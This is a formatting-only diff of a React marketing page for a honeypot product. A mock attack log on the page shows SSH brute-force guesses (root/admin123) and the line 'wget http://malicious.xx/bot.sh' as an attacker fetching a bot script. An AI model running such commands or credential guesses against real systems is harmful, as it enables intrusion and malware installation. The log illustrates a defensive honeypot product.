@@ -1,27 +1,33 @@
-"use client";
+'use client';
 
-import { useTranslations } from "next-intl";
-import FadeInUp from "@/components/FadeInUp";
-import SectionWrapper from "@/components/ui/SectionWrapper";
-import SectionTitle from "@/components/ui/SectionTitle";
-import { Link } from "@/navigation";
-import { ArrowRight } from "lucide-react";
+import { useTranslations } from 'next-intl';
+import FadeInUp from '@/components/FadeInUp';
+import SectionWrapper from '@/components/ui/SectionWrapper';
+import SectionTitle from '@/components/ui/SectionTitle';
+import { Link } from '@/navigation';
+import { ArrowRight } from 'lucide-react';
 import {
-  NetworkIcon, ScanIcon, GlobalIcon,
-  SettingsIcon, ShieldIcon, TerminalIcon, TeamIcon, EnterpriseIcon,
-} from "@/components/ui/BrandIcons";
+  NetworkIcon,
+  ScanIcon,
+  GlobalIcon,
+  SettingsIcon,
+  ShieldIcon,
+  TerminalIcon,
+  TeamIcon,
+  EnterpriseIcon,
+} from '@/components/ui/BrandIcons';
 
 /* ─── Icon maps ─── */
 const featureIcons = [NetworkIcon, ScanIcon, GlobalIcon, SettingsIcon, NetworkIcon, ShieldIcon];
-const featureKeys = ["item1", "item2", "item3", "item4", "item5", "item6"] as const;
+const featureKeys = ['item1', 'item2', 'item3', 'item4', 'item5', 'item6'] as const;
 
 const useCaseIcons = [TerminalIcon, TeamIcon, EnterpriseIcon];
-const useCaseKeys = ["item1", "item2", "item3"] as const;
+const useCaseKeys = ['item1', 'item2', 'item3'] as const;
 
-const stepKeys = ["step1", "step2", "step3", "step4", "step5"] as const;
+const stepKeys = ['step1', 'step2', 'step3', 'step4', 'step5'] as const;
 
 export default function ProductTrapContent() {
-  const t = useTranslations("product.trap");
+  const t = useTranslations('product.trap');
 
   return (
     <>
@@ -38,16 +44,15 @@ export default function ProductTrapContent() {
           </FadeInUp>
           <FadeInUp delay={0.05}>
             <p className="text-[11px] uppercase tracking-[0.15em] text-brand-sage font-semibold mb-4">
-              {t("overline")}
+              {t('overline')}
             </p>
             <h1 className="text-[clamp(36px,4.5vw,56px)] font-extrabold leading-[1.08] tracking-tight text-text-primary max-w-3xl mx-auto">
-              {t("title")}{" "}
-              <span className="text-brand-sage">{t("titleHighlight")}</span>
+              {t('title')} <span className="text-brand-sage">{t('titleHighlight')}</span>
             </h1>
           </FadeInUp>
           <FadeInUp delay={0.1}>
             <p className="text-xl text-text-secondary max-w-xl mx-auto mt-6 leading-relaxed">
-              {t("subtitle")}
+              {t('subtitle')}
             </p>
           </FadeInUp>
         </div>
@@ -58,19 +63,15 @@ export default function ProductTrapContent() {
         <div className="max-w-3xl mx-auto">
           <FadeInUp>
             <p className="text-[11px] uppercase tracking-[0.12em] text-brand-sage font-semibold mb-4">
-              {t("problem.overline")}
+              {t('problem.overline')}
             </p>
             <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary leading-[1.1]">
-              {t("problem.title")}
+              {t('problem.title')}
             </h2>
           </FadeInUp>
           <FadeInUp delay={0.1}>
-            <p className="text-text-secondary mt-5 leading-relaxed">
-              {t("problem.desc")}
-            </p>
-            <p className="text-text-secondary mt-4 leading-relaxed">
-              {t("problem.desc2")}
-            </p>
+            <p className="text-text-secondary mt-5 leading-relaxed">{t('problem.desc')}</p>
+            <p className="text-text-secondary mt-4 leading-relaxed">{t('problem.desc2')}</p>
           </FadeInUp>
         </div>
       </SectionWrapper>
@@ -81,10 +82,10 @@ export default function ProductTrapContent() {
           <div>
             <FadeInUp>
               <p className="text-[11px] uppercase tracking-[0.12em] text-brand-sage font-semibold mb-4">
-                {t("howItWorks.overline")}
+                {t('howItWorks.overline')}
               </p>
               <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary leading-[1.1]">
-                {t("howItWorks.title")}
+                {t('howItWorks.title')}
               </h2>
             </FadeInUp>
             <FadeInUp delay={0.1}>
@@ -92,7 +93,7 @@ export default function ProductTrapContent() {
                 {stepKeys.map((key, i) => (
                   <div key={key} className="flex gap-4 items-start">
                     <span className="text-xs font-bold text-brand-sage font-mono shrink-0 w-6">
-                      {String(i + 1).padStart(2, "0")}
+                      {String(i + 1).padStart(2, '0')}
                     </span>
                     <div>
                       <p className="text-sm font-semibold text-text-primary">
@@ -111,20 +112,52 @@ export default function ProductTrapContent() {
             <div className="bg-surface-2 rounded-xl border border-border overflow-hidden">
               <div className="bg-surface-3 px-4 py-3 border-b border-border">
                 <span className="text-sm font-semibold text-text-primary">
-                  {t("howItWorks.logTitle")}
+                  {t('howItWorks.logTitle')}
                 </span>
               </div>
               <div className="p-4 font-mono text-xs space-y-2">
                 {[
-                  { time: "03:12:41", text: "Honeypot SSH (port 2222) connection from 185.220.xx.xx", color: "text-[#f59e0b]" },
-                  { time: "03:12:43", text: "Brute-force attempt: root/admin123", color: "text-[#ef4444]" },
-                  { time: "03:12:44", text: "Brute-force attempt: root/password", color: "text-[#ef4444]" },
-                  { time: "03:12:47", text: "Login succeeded (honeypot credentials)", color: "text-[#f59e0b]" },
-                  { time: "03:12:49", text: "Command: uname -a", color: "text-text-secondary" },
-                  { time: "03:12:51", text: "Command: wget http://malicious.xx/bot.sh", color: "text-[#ef4444]" },
-                  { time: "03:12:52", text: "File captured: bot.sh (SHA256: 8a3f...)", color: "text-[#22c55e]" },
-                  { time: "03:12:55", text: "Attacker profile: automated scanner, low sophistication", color: "text-brand-sage" },
-                  { time: "03:12:56", text: "IOC submitted to collective intelligence", color: "text-brand-sage" },
+                  {
+                    time: '03:12:41',
+                    text: 'Honeypot SSH (port 2222) connection from 185.220.xx.xx',
+                    color: 'text-[#f59e0b]',
+                  },
+                  {
+                    time: '03:12:43',
+                    text: 'Brute-force attempt: root/admin123',
+                    color: 'text-[#ef4444]',
+                  },
+                  {
+                    time: '03:12:44',
+                    text: 'Brute-force attempt: root/password',
+                    color: 'text-[#ef4444]',
+                  },
+                  {
+                    time: '03:12:47',
+                    text: 'Login succeeded (honeypot credentials)',
+                    color: 'text-[#f59e0b]',
+                  },
+                  { time: '03:12:49', text: 'Command: uname -a', color: 'text-text-secondary' },
+                  {
+                    time: '03:12:51',
+                    text: 'Command: wget http://malicious.xx/bot.sh',
+                    color: 'text-[#ef4444]',
+                  },
+                  {
+                    time: '03:12:52',
+                    text: 'File captured: bot.sh (SHA256: 8a3f...)',
+                    color: 'text-[#22c55e]',
+                  },
+                  {
+                    time: '03:12:55',
+                    text: 'Attacker profile: automated scanner, low sophistication',
+                    color: 'text-brand-sage',
+                  },
+                  {
+                    time: '03:12:56',
+                    text: 'IOC submitted to collective intelligence',
+                    color: 'text-brand-sage',
+                  },
                 ].map((line, i) => (
                   <div key={i} className="flex gap-3">
                     <span className="text-text-muted shrink-0">{line.time}</span>
@@ -140,9 +173,9 @@ export default function ProductTrapContent() {
       {/* ── Features ── */}
       <SectionWrapper>
         <SectionTitle
-          overline={t("features.overline")}
-          title={t("features.title")}
-          subtitle={t("features.subtitle")}
+          overline={t('features.overline')}
+          title={t('features.title')}
+          subtitle={t('features.subtitle')}
         />
         <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 mt-14">
           {featureKeys.map((key, i) => {
@@ -166,10 +199,7 @@ export default function ProductTrapContent() {
 
       {/* ── Use Cases ── */}
       <SectionWrapper dark>
-        <SectionTitle
-          overline={t("useCases.overline")}
-          title={t("useCases.title")}
-        />
+        <SectionTitle overline={t('useCases.overline')} title={t('useCases.title')} />
         <div className="grid sm:grid-cols-3 gap-6 mt-14">
           {useCaseKeys.map((key, i) => {
             const Icon = useCaseIcons[i];
@@ -195,11 +225,9 @@ export default function ProductTrapContent() {
         <div className="text-center">
           <FadeInUp>
             <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary">
-              {t("cta.title")}
+              {t('cta.title')}
             </h2>
-            <p className="text-text-secondary mt-3 max-w-lg mx-auto">
-              {t("cta.desc")}
-            </p>
+            <p className="text-text-secondary mt-3 max-w-lg mx-auto">{t('cta.desc')}</p>
           </FadeInUp>
           <FadeInUp delay={0.1}>
             <div className="flex flex-wrap justify-center gap-3 mt-8">
@@ -207,13 +235,13 @@ export default function ProductTrapContent() {
                 href="/early-access"
                 className="inline-flex items-center gap-2 bg-brand-sage text-surface-0 font-semibold rounded-full px-8 py-3.5 hover:bg-brand-sage-light transition-all duration-200 active:scale-[0.98]"
               >
-                {t("cta.cta1")} <ArrowRight className="w-4 h-4" />
+                {t('cta.cta1')} <ArrowRight className="w-4 h-4" />
               </Link>
               <Link
                 href="/product/guard"
                 className="border border-border text-text-secondary hover:text-text-primary hover:border-brand-sage font-semibold rounded-full px-8 py-3.5 transition-all duration-200"
               >
-                {t("cta.cta2")}
+                {t('cta.cta2')}
               </Link>
             </div>
           </FadeInUp>
